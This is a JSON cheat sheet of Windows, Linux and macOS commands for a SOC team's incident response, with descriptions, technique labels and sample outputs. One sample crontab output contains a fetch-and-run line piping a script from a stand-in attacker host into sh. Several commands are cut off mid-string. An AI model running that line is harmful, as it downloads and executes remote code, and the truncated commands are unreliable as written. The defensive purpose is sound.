{
  "version": "1.0.0",
  "updated": "2025-10-23",
  "repository": "https://github.com/MallikarjunaKanike/terminal-assist",
  "author": "Mallikarjuna Kanike - SOC Team",
  "totalCommands": 104,
  "windows": [
    {
      "title": "List user accounts",
      "command": "net user",
      "desc": "Lists all local Windows user accounts. Use this to spot unauthorized users or accounts created by attackers.",
      "example": "net user",
      "technique": "Valid Accounts",
      "output": "User accounts for \\\\MY-PC:\\n-------------------------------------------------\\nAdministrator  DefaultAccount  Guest  johndoe\\nThe command completed successfully."
    },
    {
      "title": "Show all currently logged-in sessions (console, RDP)",
      "command": "query user",
      "desc": "Get info on all console and RDP sessions, including any remote use and privilege escalation points.",
      "example": "query user",
      "technique": "Account Discovery",
      "output": "USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME\\njohndoe               console             1    Active      none     2025-10-17 08:30"
    },
    {
      "title": "Show currently logged-in users (console/RDP, alternate)",
      "command": "qwinsta",
      "desc": "List all user sessions on the system (console and remote).",
      "example": "qwinsta",
      "technique": "Valid Accounts",
      "output": "SESSIONNAME  USERNAME  ID  STATE  TYPE  DEVICE\\n>console     admin1     0   Active  wdcon\\nrdp-tcp#1    jdoe       2   Active  rdpwd"
    },
    {
      "title": "Log off a user session",
      "command": "logoff <session_ID>",
      "desc": "Terminates a specific session by ID to boot off a suspicious user.",
      "example": "logoff 2",
      "technique": "Account Management",
      "output": "User session 2 has been logged off."
    },
    {
      "title": "View detailed user information",
      "command": "net user jdoe",
      "desc": "Shows password policies, account creation details, and group memberships.",
      "example": "net user jdoe",
      "technique": "Account Discovery",
      "output": "User name: jdoe\\nLocal Group Memberships: Administrators  Users\\nPassword last set: 10/15/2025"
    },
    {
      "title": "Disable a user account",
      "command": "net user jdoe /active:no",
      "desc": "Temporarily disable a suspicious user without deleting the account.",
      "example": "net user jdoe /active:no",
      "technique": "Account Control",
      "output": "The command completed successfully."
    },
    {
      "title": "Find local admins (users, groups)",
      "command": "net localgroup administrators",
      "desc": "Lists all members (users & groups) part of the Administrators group; spot escalation or backdoor users.",
      "example": "net localgroup administrators",
      "technique": "Account Discovery",
      "output": "Alias name     Administrators\\n----------------------------------------\\nAdministrator\\njohndoe\\nThe command completed successfully."
    },
    {
      "title": "List domain users",
      "command": "net user /domain",
      "desc": "Lists all domain user accounts visible to the current machine.",
      "example": "net user /domain",
      "technique": "Account Discovery",
      "output": "User accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nAdministrator  SOCAdmin  helpdesk  john.doe"
    },
    {
      "title": "List all domain groups",
      "command": "net group /domain",
      "desc": "Enumerates all Active Directory groups.",
      "example": "net group /domain",
      "technique": "Group Discovery",
      "output": "Group accounts for \\\\CORP.LOCAL:\\n-------------------------------------------------\\nDomain Admins\\nEnterprise Admins\\nRDPAccess\\nFinance-AppUsers"
    },
    {
      "title": "View members of specific AD group",
      "command": "net group \\",
      "desc": "Shows members of key privileged domain groups.",
      "example": "net group \\",
      "technique": "Privilege Enumeration",
      "output": "Members of group Domain Admins:\\n-------------------------------------------------\\nAdministrator\\nSOC-IRTeam"
    },
    {
      "title": "Find computer objects in domain",
      "command": "net group \\",
      "desc": "Lists all workstation/server objects in AD; spot unauthorized hostnames.",
      "example": "net group \\",
      "technique": "Network Discovery",
      "output": "PC-01  WS-002  LAPT-007"
    },
    {
      "title": "Identify the domain controller",
      "command": "nltest /dsgetdc:corp.local",
      "desc": "Returns the domain controller the machine uses.",
      "example": "nltest /dsgetdc:corp.local",
      "technique": "Network Discovery",
      "output": "DC: \\\\DC01.CORP.LOCAL Address: \\\\10.10.0.1 Site: HQ"
    },
    {
      "title": "Get domain trust relationships",
      "command": "nltest /domain_trusts",
      "desc": "Shows trust relationships between domains for lateral movement analysis.",
      "example": "nltest /domain_trusts",
      "technique": "Lateral Movement Discovery",
      "output": "Trusted domain: partnerlab.local  (Outbound trust)"
    },
    {
      "title": "View current Kerberos tickets",
      "command": "klist",
      "desc": "Shows active Kerberos tickets in user session.",
      "example": "klist",
      "technique": "Credential Access",
      "output": "Client: john@CORP.LOCAL\\nServer: krbtgt/CORP.LOCAL\\nEnd Time: 10/22/2025 11:30:45"
    },
    {
      "title": "Check current domain and logon details",
      "command": "whoami /all",
      "desc": "Shows domain membership, group SIDs, and privileges for logged-in user.",
      "example": "whoami /all",
      "technique": "Account and Group Discovery",
      "output": "User Name: CORP\\\\john.doe\\nGroup Memberships: Domain Users, RDPAccess"
    },
    {
      "title": "List all AD users (requires RSAT)",
      "command": "Get-ADUser -Filter * | Select Name,SamAccountName,Enabled",
      "desc": "Retrieves all users in the domain with enabled state.",
      "example": "Get-ADUser -Filter * | Select Name,Enabled",
      "technique": "Domain Account Enumeration",
      "output": "John Doe True\\nSOC Admin True\\nTempUser False"
    },
    {
      "title": "Get detailed info for an AD user",
      "command": "Get-ADUser -Identity john.doe -Properties *",
      "desc": "Shows metadata including last logon, groups, password expiration.",
      "example": "Get-ADUser -Identity SOCAdmin -Properties DisplayName,LastLogonDate",
      "technique": "Credential Audit",
      "output": "DisplayName: SOC Admin\\nLastLogonDate: 10/21/2025 19:44:23"
    },
    {
      "title": "List all AD computers",
      "command": "Get-ADComputer -Filter * | Select Name,OperatingSystem,Enabled",
      "desc": "Identifies joined machines in AD and OS details.",
      "example": "Get-ADComputer -Filter * | Select Name,OperatingSystem",
      "technique": "Asset Discovery",
      "output": "DC01  Windows Server 2022\\nLAPTOP07  Windows 11"
    },
    {
      "title": "Find locked user accounts",
      "command": "Search-ADAccount -LockedOut | Select-Object Name,LastLogonDate",
      "desc": "Lists locked accounts possibly linked to brute-force or password-spray activity.",
      "example": "Search-ADAccount -LockedOut",
      "technique": "Account Lockout Detection",
      "output": "james.wilson  Locked  LastLogonDate: 10/21/2025"
    },
    {
      "title": "Show disabled accounts",
      "command": "Search-ADAccount -AccountDisabled | Select Name",
      "desc": "Retrieves disabled accounts to confirm access control hygiene.",
      "example": "Search-ADAccount -AccountDisabled",
      "technique": "Account Control Audit",
      "output": "temp.contractor\\nservice.test"
    },
    {
      "title": "List group members",
      "command": "Get-ADGroupMember -Identity 'Domain Admins' | Select Name,SamAccountName",
      "desc": "Shows current membership of a privileged AD group.",
      "example": "Get-ADGroupMember -Identity 'Enterprise Admins'",
      "technique": "Privileged Role Enumeration",
      "output": "Administrator\\nIR-SOC-Lead"
    },
    {
      "title": "Get AD trust relationships",
      "command": "Get-ADTrust -Filter * | Select Name,Direction,TrustType",
      "desc": "Reviews domain trust configurations for access checks.",
      "example": "Get-ADTrust -Filter *",
      "technique": "Trust Relationship Discovery",
      "output": "partnerlab.local  Outbound  External"
    },
    {
      "title": "Enumerate organizational units (OUs)",
      "command": "Get-ADOrganizationalUnit -Filter * | Select Name,DistinguishedName",
      "desc": "Displays OUs targeted for delegation or persistence.",
      "example": "Get-ADOrganizationalUnit -Filter *",
      "technique": "Organizational Discovery",
      "output": "Name: HR_Department\\nDN: OU=HR_Department,DC=corp,DC=local"
    },
    {
      "title": "List running services",
      "command": "net start",
      "desc": "Displays services that are actively running, useful for spotting disguised malware services.",
      "example": "net start",
      "technique": "Service Discovery",
      "output": "Windows Update\\nDefender Antivirus Service\\nEvilSvc"
    },
    {
      "title": "Query all services with state",
      "command": "sc query type= service state= all",
      "desc": "Retrieve all services and their states to detect newly installed ones.",
      "example": "sc queryex type= service",
      "technique": "Service Enumeration",
      "output": "SERVICE_NAME: EvilSvc\\n        TYPE: 10  WIN32_OWN_PROCESS\\n        STATE: 1  STOPPED"
    },
    {
      "title": "Show running process services",
      "command": "tasklist /svc",
      "desc": "Links active process image names to loaded Windows services for rootkit/persistence hunting.",
      "example": "tasklist /svc",
      "technique": "Service Discovery",
      "output": "Image Name                     PID Services\\nsvchost.exe                 1080 AudioSrv, Dhcp, EventLog, lmhosts, wuauserv"
    },
    {
      "title": "Show running processes",
      "command": "tasklist",
      "desc": "Enumerates all current processes in the system. Use to spot resource hogs, weird names/paths, or unapproved software.",
      "example": "tasklist",
      "technique": "Process Discovery",
      "output": "Image Name                     PID Session Name        Session#    Mem Usage\\nexplorer.exe                  2036 Console                    1     76,712 K"
    },
    {
      "title": "Show all scheduled tasks/jobs",
      "command": "schtasks /query /fo LIST /v",
      "desc": "Enumerates all scheduled tasks, triggers, run-as credentials. Essential for persistence or unusual scheduled code detections.",
      "example": "schtasks /query /fo LIST /v",
      "technique": "Scheduled Task/Job",
      "output": "TaskName:             \\\\UpdateTask\\nNext Run Time:         10/18/2025 2:00:00 AM\\nStatus:                Ready\\nLast Run Result:       0\\nScheduled Task State:  Enabled"
    },
    {
      "title": "Delete a scheduled task",
      "command": "schtasks /delete /tn \\",
      "desc": "Removes a suspicious persistence task.",
      "example": "schtasks /delete /tn \\",
      "technique": "Defense Evasion",
      "output": "SUCCESS: The scheduled task \"malicious_task\" was successfully deleted."
    },
    {
      "title": "Find user logon persistence/startup programs",
      "command": "wmic startup get caption,command",
      "desc": "Identifies executables or commands set to run on logon; a common attacker persistence mechanism.",
      "example": "wmic startup get caption,command",
      "technique": "Boot or Logon Autostart Execution",
      "output": "Caption            Command\\nOneDrive            \"C:\\\\Program Files\\\\Microsoft OneDrive\\\\OneDrive.exe\" /background\\nMaliciousUpdater    \"C:\\\\Temp\\\\evil.exe\""
    },
    {
      "title": "Enumerate autostart registry entries",
      "command": "reg query HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
      "desc": "Lists programs configured to auto-start system-wide.",
      "example": "reg query HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
      "technique": "Registry Run Keys / Startup Folder",
      "output": "malware.exe    REG_SZ    C:\\\\Users\\\\Public\\\\malware.exe"
    },
    {
      "title": "Search registry for suspicious startup paths",
      "command": "reg query HKLM /f evil.exe /t REG_SZ /s",
      "desc": "Quickly locates registry persistence referencing a malicious binary.",
      "example": "reg query HKLM /f malware.exe /s",
      "technique": "Persistence Discovery",
      "output": "HKEY_LOCAL_MACHINE\\\\...\\\\Run    REG_SZ    C:\\\\Windows\\\\evil.exe"
    },
    {
      "title": "List startup folder items",
      "command": "dir \\",
      "desc": "Displays scripts, links, or executables set to auto-launch on logon.",
      "example": "dir C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup",
      "technique": "Startup Folder Persistence",
      "output": "10/22/2025  10:00 AM  evilshortcut.lnk"
    },
    {
      "title": "List all event log channels",
      "command": "wevtutil el",
      "desc": "Lists all event log sources and channels; enumerate for advanced log demand.",
      "example": "wevtutil el",
      "technique": "Event Log Discovery",
      "output": "System\\nSecurity\\nApplication\\nSetup\\nWindows PowerShell\\n..."
    },
    {
      "title": "Get last 10 security events",
      "command": "wevtutil qe Security /f:text /c:10",
      "desc": "View the 10 most recent events in the Windows Security log—for authentication, escalation, and anomaly hunting.",
      "example": "wevtutil qe Security /f:text /c:10",
      "technique": "Authentication Discovery",
      "output": "Event[0]:\\n  LogonType: 2 (Interactive)\\n  Subject: johndoe\\n  Message: An account was successfully logged on."
    },
    {
      "title": "Show all active network connections and owning process PID",
      "command": "netstat -ano",
      "desc": "Displays all open TCP/UDP ports and their owning processes. Critical for finding C2 beaconing, lateral movement, or malware listeners.",
      "example": "netstat -ano",
      "technique": "Network Connection Discovery",
      "output": "Proto  Local Address          Foreign Address        State           PID\\nTCP    0.0.0.0:3389          0.0.0.0:0              LISTENING       1048\\nTCP    192.168.56.1:139      0.0.0.0:0              LISTENING       4\\nUDP    0.0.0.0:123           *:*                                   608"
    },
    {
      "title": "List all listening ports with process info",
      "command": "netstat -abno",
      "desc": "Displays the executable associated with each network connection or listener.",
      "example": "netstat -abno | more",
      "technique": "Network Service Discovery",
      "output": "[powershell.exe] TCP 0.0.0.0:5985 LISTENING 1234"
    },
    {
      "title": "Display network interfaces and IPs",
      "command": "ipconfig /all",
      "desc": "Useful for detecting rogue adapters or DNS manipulation.",
      "example": "ipconfig /all",
      "technique": "Network Configuration Discovery",
      "output": "Ethernet adapter CorpNet: IPv4 Address: 10.0.0.10"
    },
    {
      "title": "View active Windows Firewall rules",
      "command": "netsh advfirewall firewall show rule name=all",
      "desc": "Lists all defined inbound/outbound rules for anomaly checks.",
      "example": "netsh advfirewall firewall show rule name=all | findstr /i block",
      "technique": "Firewall Configuration Discovery",
      "output": "Rule Name: Block Suspicious Connection"
    },
    {
      "title": "Show all Windows firewall profiles and rules",
      "command": "netsh advfirewall show allprofiles",
      "desc": "Diagnose open/closed firewall profiles and find dangerous exceptions.",
      "example": "netsh advfirewall show allprofiles",
      "technique": "Firewall/Network Security Discovery",
      "output": "Domain Profile Settings:\\n----------------------------------------------------------------------\\nState                                 ON\\nAllow inbound remote admin exceptions: No\\n..."
    },
    {
      "title": "Enable firewall for all profiles",
      "command": "netsh advfirewall set allprofiles state on",
      "desc": "Ensures firewall protection is active system-wide.",
      "example": "netsh advfirewall set allprofiles state on",
      "technique": "Firewall Control",
      "output": "Ok."
    },
    {
      "title": "Check domain, public, and private firewall profiles",
      "command": "netsh advfirewall show allprofiles",
      "desc": "Displays status and global settings for each network profile.",
      "example": "netsh advfirewall show allprofiles",
      "technique": "Firewall State Review",
      "output": "Domain Profile: ON, Private Profile: ON, Public Profile: OFF"
    },
    {
      "title": "View Microsoft Defender status",
      "command": "sc query windefend",
      "desc": "Confirms Defender service is active and operational.",
      "example": "sc query windefend",
      "technique": "Security Software Discovery",
      "output": "SERVICE_NAME: WinDefend\\nSTATE: 4  RUNNING"
    },
    {
      "title": "Quick Defender full scan",
      "command": "MpCmdRun -Scan -ScanType 2",
      "desc": "Start a full antivirus scan with Windows Defender to catch malware or backdoors.",
      "example": "MpCmdRun -Scan -ScanType 2",
      "technique": "Malware Detection",
      "output": "Scan started...\\nThreats found: 0"
    },
    {
      "title": "Run quick Defender scan",
      "command": "MpCmdRun.exe -Scan -ScanType 1",
      "desc": "Triggers a quick malware scan using Windows Defender CLI.",
      "example": "\\",
      "technique": "Malware Detection",
      "output": "Scan starting...\\nNo threats detected."
    },
    {
      "title": "Update Defender definitions",
      "command": "MpCmdRun.exe -SignatureUpdate",
      "desc": "Updates antivirus definitions before initiating analysis.",
      "example": "MpCmdRun.exe -SignatureUpdate",
      "technique": "Preventive Maintenance",
      "output": "Signature update started...\\nCompleted successfully."
    },
    {
      "title": "Dump file/folder ACLs (permissions)",
      "command": "icacls C:\\\\SensitiveFolder",
      "desc": "Audit file/folder permissions for excessive, risky or exfil-targeted files.",
      "example": "icacls C:\\\\SensitiveFolder",
      "technique": "File and Directory Discovery",
      "output": "C:\\\\SensitiveFolder BUILTIN\\\\Administrators:(I)(F)\\nNT AUTHORITY\\\\SYSTEM:(I)(F)\\nEveryone:(I)(OI)(CI)(RX)"
    }
  ],
  "linux": [
    {
      "title": "List all user accounts",
      "command": "cat /etc/passwd",
      "desc": "Enumerates every local account, including dormant/service accounts. Check for unauthorized or recently added users.",
      "example": "cat /etc/passwd",
      "technique": "Valid Accounts",
      "output": "root:x:0:0:root:/root:/bin/bash\nuser1:x:1001:1001:User One:/home/user1:/bin/bash"
    },
    {
      "title": "Show all currently logged-in users",
      "command": "who",
      "desc": "Lists interactive shell sessions for the system. Look for anomalous users or consoles.",
      "example": "who",
      "technique": "Account Discovery",
      "output": "user1  pts/0        2025-10-17 08:42 (:0)"
    },
    {
      "title": "Show login/logout history (timeline)",
      "command": "last",
      "desc": "Shows when each user/session last logged on/off. Includes SSH, local, and reboot.",
      "example": "last",
      "technique": "Logon Session Discovery",
      "output": "user1  pts/0        2025-10-16 07:22   still logged in\nreboot system boot  2025-10-15 07:19"
    },
    {
      "title": "Show last login for each user",
      "command": "lastlog",
      "desc": "When was the last successful login for every account?",
      "example": "lastlog",
      "technique": "Account Discovery",
      "output": "Username         Port     From             Latest\nroot             pts/0    192.168.1.2      Fri Oct 17 09:23:11 +0000 2025"
    },
    {
      "title": "Show group memberships (privilege review)",
      "command": "cat /etc/group",
      "desc": "Discovers group and sudo/admin memberships for lateral movement and privilege escalation.",
      "example": "cat /etc/group",
      "technique": "Account Discovery",
      "output": "sudo:x:27:user1,analyst\nadm:x:4:user1,syslog"
    },
    {
      "title": "List running processes (complete)",
      "command": "ps aux",
      "desc": "Shows all processes, owners, and resource usage. Essential for malware and rootkit hunting.",
      "example": "ps aux",
      "technique": "Process Discovery",
      "output": "root    1  0.0  0.3  16900  1864 ?  Ss   10:01   0:04 /sbin/init\nuser1 2011  0.0  0.1  11636   904 pts/0    S+   10:58   0:00 bash"
    },
    {
      "title": "Show process tree (parent-child linkage)",
      "command": "pstree -p",
      "desc": "Hierarchical view of processesâ€”find suspicious parents, injected code, etc.",
      "example": "pstree -p",
      "technique": "Process Discovery",
      "output": "systemd(1)â”€sshd(766)â”€bash(2013)â”€pstree(2089)"
    },
    {
      "title": "Monitor resource usage live",
      "command": "top -n 1",
      "desc": "Displays system-wide CPU, memory usage, and top processes. Reveals runaway/abusive activity.",
      "example": "top -n 1",
      "technique": "Process Discovery",
      "output": "top - 10:30:34 up 20 days, 5:21, 2 users, load average: 0.03, 0.09, 0.09\nTasks: 92 total, 1 running, 91 sleeping, 0 stopped, 0 zombie\n%Cpu(s): 3.0 us, 1.0 sy, 0.0 ni, 96.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st"
    },
    {
      "title": "List listening/open ports",
      "command": "ss -tuln",
      "desc": "Find server services, network listeners, and unwanted/rogue daemons.",
      "example": "ss -tuln",
      "technique": "Network Service Discovery",
      "output": "Netid State  Recv-Q Send-Q Local Address:Port Peer Address:Port\nudp   UNCONN 0      0      0.0.0.0:68     0.0.0.0:*"
    },
    {
      "title": "Show external connections (with process mapping)",
      "command": "netstat -antup",
      "desc": "List all connections and find malware communicating with outside hosts.",
      "example": "netstat -antup",
      "technique": "Network Connection Discovery",
      "output": "tcp    0    0 0.0.0.0:22   0.0.0.0:*    LISTEN   1053/sshd\ntcp    0    0 192.168.1.2:47724  93.184.216.34:443  ESTABLISHED  1000/malware"
    },
    {
      "title": "Show open files for a process",
      "command": "lsof -p [PID]",
      "desc": "See what files, sockets etc., a process is using. Correlate with malware or data theft.",
      "example": "lsof -p 1053",
      "technique": "File and Directory Discovery",
      "output": "COMMAND   PID USER   FD   TYPE DEVICE SIZE/OFF  NODE NAME\nsshd      1053 root  3u  IPv4  6947      0t0    TCP *:22 (LISTEN)"
    },
    {
      "title": "Show recent authentication logins/errors",
      "command": "cat /var/log/auth.log | tail -n 10",
      "desc": "View authentication attempts, failed logins, sudo requests.",
      "example": "cat /var/log/auth.log",
      "technique": "Authentication Discovery",
      "output": "Oct 17 10:44:14 server sshd[1227]: Accepted password for user1 from 192.168.1.50 port 54012 ssh2\nOct 17 10:45:02 server su[1332]: pam_unix(su-l:session): session opened for user root"
    },
    {
      "title": "Find files modified recently",
      "command": "find / -mtime -2 -ls",
      "desc": "List all files changed in last 2 days (malware install, tampering, attack artifact).",
      "example": "find /tmp -mtime -2 -ls",
      "technique": "File Modification Discovery",
      "output": "123456    8 -rw-r--r--   1 root root  1024 Oct 15 23:54 /tmp/malicious.sh"
    },
    {
      "title": "List user's cron jobs",
      "command": "crontab -l",
      "desc": "See all scheduled jobs for the current user (for persistence, hack tools, beacons).",
      "example": "crontab -l",
      "technique": "Persistence via Scheduled Task",
      "output": "@reboot /usr/bin/curl -fsSL http://evil.site/b.sh | sh"
    },
    {
      "title": "List all network interfaces",
      "command": "ifconfig -a",
      "desc": "View every active/virtual/stale NIC. Find malicious or unauthorized network interfaces.",
      "example": "ifconfig -a",
      "technique": "Network Configuration Discovery",
      "output": "eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500\ninet 192.168.1.111  netmask 255.255.255.0\ninet6 fe80::a00:27ff:fe4e:66a1  prefixlen 64  scopeid 0x20<link>"
    },
    {
      "title": "Show the ARP table (local devices)",
      "command": "arp -a",
      "desc": "Find devices on the same network segmentâ€”may be involved in lateral movement or attack.",
      "example": "arp -a",
      "technique": "Network Discovery",
      "output": "router (192.168.1.1) at aa:bb:cc:dd:ee:ff [ether] on eth0"
    },
    {
      "title": "Show all systemd services",
      "command": "systemctl list-units --type=service",
      "desc": "Audit all loaded/running system servicesâ€”hunt persistence/rootkits.",
      "example": "systemctl list-units --type=service",
      "technique": "Service Discovery",
      "output": "UNIT                    LOAD   ACTIVE SUB     DESCRIPTION\nsshd.service            loaded active running OpenSSH Daemon\ncron.service            loaded active running Regular background program processing daemon"
    },
    {
      "title": "Show last boot log",
      "command": "cat /var/log/boot.log | tail -n 10",
      "desc": "Check for boot errors, crash evidence.",
      "example": "cat /var/log/boot.log",
      "technique": "Event Log Discovery",
      "output": "Started Update UTMP about System Boot/Shutdown.\nFinished Raise network interfaces."
    },
    {
      "title": "Show all command history (.bash_history)",
      "command": "history | less",
      "desc": "See all shell activity; traces of post-exploitation, privilege escalation, and data theft.",
      "example": "history | less",
      "technique": "Command and Script Execution",
      "output": "2025  cd /tmp\n2026  bash b.sh\n2027  rm b.sh"
    },
    {
      "title": "Inspect kernel ring buffer activity",
      "command": "dmesg | tail -20",
      "desc": "Kernel logs: hardware events, driver loads, rootkit activity.",
      "example": "dmesg | tail -5",
      "technique": "Kernel Module Discovery",
      "output": "[1623042.912838] audit: type=1100 audit(1631893462.321:52): pid=3608 uid=0 auid=1000 ..."
    },
    {
      "title": "Show root/system-wide crontab",
      "command": "cat /etc/crontab",
      "desc": "System-wide scheduled tasks. Look for privileged malware tasks.",
      "example": "cat /etc/crontab",
      "technique": "Persistence via Scheduled Task",
      "output": "0 2 * * * root /usr/local/bin/backup.sh\n* * * * * root /tmp/maliciousTask.sh"
    },
    {
      "title": "Show loaded kernel modules",
      "command": "lsmod",
      "desc": "Lists all loaded modules; rootkits and hardware support.",
      "example": "lsmod",
      "technique": "Kernel Module Discovery",
      "output": "Module                  Size  Used by\next4                  487424  1"
    },
    {
      "title": "Review SSH authorized_keys",
      "command": "cat ~/.ssh/authorized_keys",
      "desc": "Detect rogue or backdoor SSH user keys.",
      "example": "cat ~/.ssh/authorized_keys",
      "technique": "Credential Access",
      "output": "ssh-rsa AAAAB3Nza... user1@server"
    },
    {
      "title": "Check user sudo rights",
      "command": "sudo -l",
      "desc": "Shows what sudo privileges a user has (for escalation traces).",
      "example": "sudo -l",
      "technique": "Account Discovery",
      "output": "User root may run the following commands on this host:\n    (ALL : ALL) ALL\n    (ALL) NOPASSWD: /usr/bin/vim"
    },
    {
      "title": "Find SUID-root binaries (privesc)",
      "command": "find / -user root -perm -4000 -print 2>/dev/null",
      "desc": "Find all files running as root (possible privilege escalation vectors).",
      "example": "find / -user root -perm -4000 -print 2>/dev/null",
      "technique": "Privilege Escalation",
      "output": "/usr/bin/passwd\n/usr/bin/sudo\n/usr/bin/newgrp"
    }
  ],
  "mac": [
    {
      "title": "Display macOS version and build info",
      "command": "sw_vers",
      "desc": "Identifies OS version for vulnerability assessment and timeline establishment.",
      "example": "sw_vers",
      "technique": "System Information Discovery"
    },
    {
      "title": "Show system uptime and last boot time",
      "command": "uptime",
      "desc": "Determines if system was rebooted during incident timeframe - crucial for timeline analysis.",
      "example": "uptime",
      "technique": "System Information Discovery"
    },
    {
      "title": "Get full hardware info (inc. serial number)",
      "command": "system_profiler SPHardwareDataType",
      "desc": "Unique device identification and hardware configuration documentation.",
      "example": "system_profiler SPHardwareDataType",
      "technique": "System Information Discovery"
    },
    {
      "title": "List ALL user accounts (inc. hidden/system)",
      "command": "dscl . list /Users",
      "desc": "Identifies all local user accounts including hidden accounts attackers may create.",
      "example": "dscl . list /Users",
      "technique": "Valid Accounts"
    },
    {
      "title": "Show user login history (timeline)",
      "command": "last | head -20",
      "desc": "Historical login recordsâ€”timeline analysis & unauthorized access.",
      "example": "last | head -20",
      "technique": "Valid Accounts"
    },
    {
      "title": "List currently logged-in users/activity",
      "command": "w",
      "desc": "Shows active user sessions and commands running during live forensics.",
      "example": "w",
      "technique": "Valid Accounts"
    },
    {
      "title": "Get detailed info on user account",
      "command": "dscl . read /Users/username",
      "desc": "User profile details, home directory, shell type, UID.",
      "example": "dscl . read /Users/admin",
      "technique": "Valid Accounts"
    },
    {
      "title": "All running processes (detailed view)",
      "command": "ps aux",
      "desc": "Identifies suspicious processes, usage, relationships.",
      "example": "ps aux",
      "technique": "Process Discovery"
    },
    {
      "title": "Process hierarchy/parent-child tree",
      "command": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
      "desc": "Process tree analysis to identify malicious chains.",
      "example": "ps -axo user,pid,ppid,%cpu,%mem,start,time,command",
      "technique": "Process Discovery"
    },
    {
      "title": "Find resource-intensive processes (cryptominer check)",
      "command": "top -l 1 -n 10",
      "desc": "Spot CPU/memory abuse (e.g., crypto miner/malware).",
      "example": "top -l 1 -n 10",
      "technique": "Process Discovery"
    },
    {
      "title": "List all launch agents/daemons (persistence)",
      "command": "launchctl list",
      "desc": "Identifies persistence mechanisms, suspicious/rogue launch/agent services.",
      "example": "launchctl list | grep -v com.apple",
      "technique": "Persistence"
    },
    {
      "title": "Display all active network connections",
      "command": "netstat -an | grep ESTABLISHED",
      "desc": "Active connections to possible C2/malicious IPs.",
      "example": "netstat -an | grep ESTABLISHED",
      "technique": "Network Connection Discovery"
    },
    {
      "title": "Map which process owns network connections",
      "command": "lsof -i -P -n",
      "desc": "Maps processes to network connections (spot malware traffic).",
      "example": "lsof -i -P -n",
      "technique": "Network Connection Discovery"
    },
    {
      "title": "Find process using specific port",
      "command": "lsof -i :8080",
      "desc": "Identifies unauthorized services/malware listeners.",
      "example": "lsof -i :8080",
      "technique": "Network Connection Discovery"
    },
    {
      "title": "Display ARP cache",
      "command": "arp -a",
      "desc": "Identifies devices on local network (find ARP poisoning/rogue host).",
      "example": "arp -a",
      "technique": "Network Discovery"
    },
    {
      "title": "Find files modified last 7 days (timeline)",
      "command": "find /Users -type f -mtime -7 -ls",
      "desc": "Spot recently modified files during incident.",
      "example": "find /Users -type f -mtime -7 -ls",
      "technique": "File Modification Discovery"
    },
    {
      "title": "Full file metadata (MAC timestamps)",
      "command": "stat filename",
      "desc": "Complete MAC times (Modified, Accessed, Changed) + Birth time.",
      "example": "stat /tmp/suspicious.sh",
      "technique": "File Modification Discovery"
    },
    {
      "title": "Spotlight: search for files by metadata",
      "command": "mdfind 'kMDItemFSName == \\",
      "desc": "Fast search with metadata for hidden/malicious files.",
      "example": "mdfind 'kMDItemFSName == \\",
      "technique": "File Discovery"
    },
    {
      "title": "Spotlight: show full file metadata",
      "command": "mdls /tmp/suspicious.sh",
      "desc": "Extended file metadata including creation date and type.",
      "example": "mdls /tmp/suspicious.sh",
      "technique": "File Discovery"
    },
    {
      "title": "Live monitor filesystem activity",
      "command": "sudo fs_usage -f filesys",
      "desc": "Live monitoring of read/write/del file operations.",
      "example": "sudo fs_usage -f filesys",
      "technique": "File Modification Discovery"
    },
    {
      "title": "Show recent bash shell history",
      "command": "cat ~/.bash_history | tail -50",
      "desc": "Command history for attacker/antiforensic activity.",
      "example": "cat ~/.bash_history | tail -50",
      "technique": "Command and Script Execution"
    },
    {
      "title": "Show zsh shell history (with timestamps)",
      "command": "cat ~/.zsh_history",
      "desc": "Command+timestamp; better for timeline.",
      "example": "cat ~/.zsh_history",
      "technique": "Command and Script Execution"
    },
    {
      "title": "Unified Log (last hour, filter by keyword)",
      "command": "log show --last 1h --predicate 'eventMessage contains \\",
      "desc": "System-wide logging including application/system events.",
      "example": "log show --last 1h --predicate 'eventMessage contains \\",
      "technique": "Event Log Discovery"
    },
    {
      "title": "Query Unified Log for process",
      "command": "log show --predicate 'process == \\",
      "desc": "Track specific process activity, behavior patterns.",
      "example": "log show --predicate 'process == \\",
      "technique": "Event Log Discovery"
    },
    {
      "title": "Show authentication-related events",
      "command": "log show --predicate 'eventMessage contains \\",
      "desc": "Login attempts, successes, failures (security analysis).",
      "example": "log show --predicate 'eventMessage contains \\",
      "technique": "Authentication Discovery"
    },
    {
      "title": "Stream live system logs (debug)",
      "command": "log stream --level debug",
      "desc": "Real-time log stream; all system/app events.",
      "example": "log stream --level debug",
      "technique": "Event Log Discovery"
    },
    {
      "title": "Extract Safari browsing history (SQLite)",
      "command": "sqlite3 ~/Library/Safari/History.db \\",
      "desc": "Full Safari browsing history, timestamps.",
      "example": "sqlite3 ~/Library/Safari/History.db \\",
      "technique": "Browser Activity Discovery"
    },
    {
      "title": "Query Chrome browsing history (SQLite)",
      "command": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
      "desc": "Full Chrome browsing history/visits.",
      "example": "sqlite3 ~/Library/Application\\\\ Support/Google/Chrome/Default/History \\",
      "technique": "Browser Activity Discovery"
    },
    {
      "title": "Show Safari downloads (plist)",
      "command": "plutil -p ~/Library/Safari/Downloads.plist",
      "desc": "Safari download history with URLs, timestamps.",
      "example": "plutil -p ~/Library/Safari/Downloads.plist",
      "technique": "File Discovery"
    },
    {
      "title": "Show Launch Agents/Daemons locations",
      "command": "ls -la [path]",
      "desc": "Persistence: check user/system LaunchAgents/LaunchDaemons.",
      "example": "ls -la ~/Library/LaunchAgents",
      "technique": "Persistence"
    },
    {
      "title": "Check for user-level LaunchAgents",
      "command": "ls -la ~/Library/LaunchAgents",
      "desc": "Persistence running on user login.",
      "example": "ls -la ~/Library/LaunchAgents",
      "technique": "Persistence"
    },
    {
      "title": "Check for root/boot LaunchDaemons",
      "command": "sudo ls -la /Library/LaunchDaemons",
      "desc": "System daemons running with root.",
      "example": "sudo ls -la /Library/LaunchDaemons",
      "technique": "Persistence"
    }
  ]
}
